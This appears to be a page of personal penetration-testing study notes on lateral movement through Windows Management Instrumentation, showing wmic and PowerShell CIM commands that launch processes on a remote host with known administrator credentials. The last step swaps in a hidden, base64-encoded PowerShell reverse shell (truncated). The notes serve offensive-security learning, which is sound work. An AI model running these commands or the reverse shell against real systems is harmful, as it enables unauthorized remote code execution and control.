public:: true

- [Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) is an object-oriented feature that facilitates task automation.
- #+BEGIN_PINNED
  It uses **port 135** for remote access and uses a higher-range port *(19152-65535)* for session data.
  #+END_PINNED
- The `wmci` utility has been [deprecated around 21H1](https://learn.microsoft.com/en-us/windows/whats-new/deprecated-features), but let see how it can be used to spawn a process to a remote target for which we know administrator credentials
  id:: 65a7a0b2-1d28-4245-9f26-d094d4c26a84
	- ```cmd
	  wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
	  ```
	- #+BEGIN_IMPORTANT
	  System processes and services always run in [**session 0**](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361) as part of session isolation, which was introduced in Windows Vista. Because the *WMI Provider Host* is running as a **system service**, newly created processes through WMI are also spawned in **session 0**.
	  #+END_IMPORTANT
- Powershell is used nowadays as replacement for `wmci`, let's see how to use it to achieve the same ran as before.
	- First, we need to create a [PSCredential](https://learn.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.2) object to store the domain user credentials that we use to access the remote target.
	  logseq.order-list-type:: number
		- ```powershell
		  $username = 'jen';
		  $password = 'Nexus123!';
		  $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
		  $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
		  ```
	- Next, we create a [*Common Information Model*](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-7.2) (CIM) object and specify the target IP, creds to use and which process to start.
	  logseq.order-list-type:: number
		- ```powershell
		  $options = New-CimSessionOption -Protocol DCOM
		  $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options 
		  $command = 'calc';
		  ```
	- Finally, we execute the process on the remote target.
	  logseq.order-list-type:: number
		- ```powershell
		  Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$command};
		  ```
	- A more useful command to execute remotely could be a reverse shell. From the previous example we can simply swap the `$command` variable with something similar to a base64 powershell encoded [reverse shell]([[Windows Reverse Shells]]).
	  id:: 65a01d55-0fd2-4bbd-9251-edd80b50bbb9
		- ```powershell
		  $command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
		  ```